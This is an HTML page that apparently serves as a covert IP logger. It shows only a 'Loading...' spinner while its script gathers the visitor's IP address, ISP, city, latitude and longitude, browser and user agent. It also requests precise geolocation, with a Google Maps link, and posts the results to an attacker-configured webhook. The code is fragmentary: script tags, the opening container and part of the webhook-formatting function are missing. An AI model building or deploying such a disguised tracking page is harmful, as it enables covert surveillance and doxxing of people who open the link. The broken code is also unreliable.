<!DOCTYPE html>

<head>
    <meta charset="UTF-8">

    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 40px;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #00ffff;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 30px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }

        .pulse {
            width: 100px;
            height: 100px;
            background: radial-gradient(circle, rgba(0, 255, 255, 0.3) 0%, transparent 70%);
            border-radius: 50%;
            margin: 0 auto;
            animation: pulse 2s infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: -1;
        }

        .loading-text {
            font-size: 18px;
            color: #00ffff;
            font-weight: 300;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0%, 100% { 
                transform: translate(-50%, -50%) scale(0.8); 
                opacity: 0.5; 
            }
            50% { 
                transform: translate(-50%, -50%) scale(1.2); 
                opacity: 0.8; 
            }
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }

        .glow {
            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
        }
    </style>
</head>
<body>

        <div class="loading-text glow">Loading<span class="dots"></span></div>
    </div>

        // Simple user agent parsing
        function parseUserAgent(ua) {
            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
            
            let os = 'Unknown';
            let browser = 'Unknown';

            if (/Windows/.test(ua)) os = 'Windows';
            else if (/Mac/.test(ua)) os = 'macOS';
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad/.test(ua)) os = 'iOS';

            if (/Chrome/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua)) browser = 'Safari';
            else if (/Edge/.test(ua)) browser = 'Edge';

            return { os, browser };
        }

        // Get continent from country code
        const getContinent = (countryCode) => {
            return continentMap[countryCode] || 'Unknown';
        };

        // Send webhook helper
        async function sendWebhook(webhookData) {
            try {
                await fetch(config.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });
            } catch (error) {
                console.error('Failed to send webhook');
            }
        }

        // Get IP information with multiple fallbacks
        async function getIPInfo() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://ipwhois.app/json/',
                'https://jsonip.com/',
                'https://api.myip.com/'
            ];

            for (let service of services) {
                try {
                    const response = await fetch(service);
                    if (!response.ok) continue;
                    
                    const data = await response.json();
                    
                    // Extract IP from different service formats
                    let ip = data.ip || data.query;
                    if (!ip) continue;

                    // Get detailed info from ip-api.com using the found IP
                    try {
                        const detailedResponse = await fetch(`https://ip-api.com/json/${ip}?fields=66846719`);
                        if (detailedResponse.ok) {
                            const detailedData = await detailedResponse.json();
                            if (detailedData.status === 'success') {
                                return {
                                    query: detailedData.query,
                                    isp: detailedData.isp || 'Unknown',
                                    as: detailedData.as || 'Unknown',
                                    continent: getContinent(detailedData.countryCode),
                                    country: detailedData.country || 'Unknown',
                                    regionName: detailedData.regionName || 'Unknown',
                                    city: detailedData.city || 'Unknown',
                                    lat: detailedData.lat || 0,
                                    lon: detailedData.lon || 0,
                                    timezone: detailedData.timezone || 'Unknown',
                                    mobile: detailedData.mobile || false,
                                    proxy: detailedData.proxy || false,
                                    hosting: detailedData.hosting || false,
                                    countryCode: detailedData.countryCode || ''
                                };
                            }
                        }
                    } catch (e) {
                        // Continue to basic info
                    }

                    // Fallback to basic info if detailed fails
                    return {
                        query: ip,
                        isp: data.org || data.isp || 'Unknown',
                        as: data.asn || data.as || 'Unknown',
                        continent: getContinent(data.country_code || data.countryCode),
                        country: data.country || data.country_name || 'Unknown',
                        regionName: data.region || data.regionName || 'Unknown',
                        city: data.city || 'Unknown',
                        lat: data.latitude || data.lat || 0,
                        lon: data.longitude || data.lon || 0,
                        timezone: data.timezone || 'Unknown',
                        mobile: false,
                        proxy: false,
                        hosting: false,
                        countryCode: data.country_code || data.countryCode || ''
                    };

                } catch (error) {
                    continue;
                }
            }
            
            throw new Error('All IP services failed');
        }

        // Get precise location
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            coords: `${position.coords.latitude},${position.coords.longitude}`,
                            accuracy: position.coords.accuracy,
                            mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        });
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // Main logging function
        async function logIP() {
            try {
                // Get IP information
                const ipData = await getIPInfo();
                
                // Get browser information
                const browserInfo = parseUserAgent(navigator.userAgent);
                
                // Bot detection
                let botStatus = 'False';
                if (ipData.hosting) {
                    botStatus = ipData.proxy ? 'Possibly' : 'True';
                }

                const logData = {
                    ipInfo: ipData,
                    browserInfo: browserInfo,
                    botStatus: botStatus
                };

                // Send main webhook
                await sendMainWebhook(logData);

                // Get precise location if enabled
                if (config.accurateLocation) {
                    const preciseLocation = await getPreciseLocation();
                    if (preciseLocation) {
                        await sendPreciseLocationWebhook(logData, preciseLocation);
                    }
                }

            } catch (error) {
                console.error('Logging failed');
            }
        }

**PC Info:**

> **Browser:** \`${data.browserInfo.browser}\`

**User Agent:**
\`\`\`
${navigator.userAgent}
\`\`\``
                }]
            };

            await sendWebhook(embed);

            await sendWebhook(embed);
        }
